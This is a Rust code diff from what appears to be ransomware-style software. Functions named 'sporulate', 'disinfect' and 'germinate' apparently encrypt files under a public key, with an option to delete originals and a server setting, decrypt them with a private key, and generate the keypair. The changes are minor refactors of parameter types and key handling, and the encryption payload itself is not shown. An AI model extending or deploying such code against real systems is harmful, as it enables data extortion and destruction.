@@ -82,7 +82,7 @@ const EXCLUDED_FILES: &[&str] = &[
 pub async fn sporulate(
     path: &Path,
     key: &Path,
-    no_delete: &bool,
+    no_delete: bool,
     server: &Option<String>,
 ) -> Result<(), AppError> {
     let public_key = load_public_key(key)?;
@@ -179,7 +179,7 @@ pub async fn sporulate(
 ///
 /// # TODO
 /// 1. Implement concurrency/parallelism to decrypt files faster.
-pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppError> {
+pub fn disinfect(path: &Path, key: &Path, no_delete: bool) -> Result<(), AppError> {
     let private_key = load_private_key(key)?;
     debug!("Loaded main private key from {:?}", key);
 
@@ -236,12 +236,12 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppErr
 /// # Returns
 /// A `Result` with a unit type on success of an AppError if the routine fails.
 pub fn germinate(path: &Path) -> Result<(), AppError> {
-    let (private_key_bytes, public_key_bytes) = generate_keypair()?;
+    let (private_key, public_key) = generate_keypair()?;
 
-    let private_key_b64 = b64_encode(&private_key_bytes);
+    let private_key_b64 = b64_encode(private_key.as_bytes());
     let private_key_path = path.join("main-private.key");
 
-    let public_key_b64 = b64_encode(&public_key_bytes);
+    let public_key_b64 = b64_encode(public_key.as_bytes());
     let public_key_path = path.join("main-public.key");
 
     let mut file = File::create(&private_key_path)?;
@@ -256,12 +256,12 @@ pub fn germinate(path: &Path) -> Result<(), AppError> {
     // sanity check to ensure the base64 encoding/decoding roundtrip works
     // as expected.
     let decoded_prikey = b64_decode(&private_key_b64)?;
-    if decoded_prikey != private_key_bytes {
+    if decoded_prikey != *private_key.as_bytes() {
         return Err(AppError::Crypto(crate::error::CryptoError::KeyVerification));
     }
 
     let decoded_pubkey = b64_decode(&public_key_b64)?;
-    if decoded_pubkey != public_key_bytes {
+    if decoded_pubkey != *public_key.as_bytes() {
         return Err(AppError::Crypto(crate::error::CryptoError::KeyVerification));
     }
 
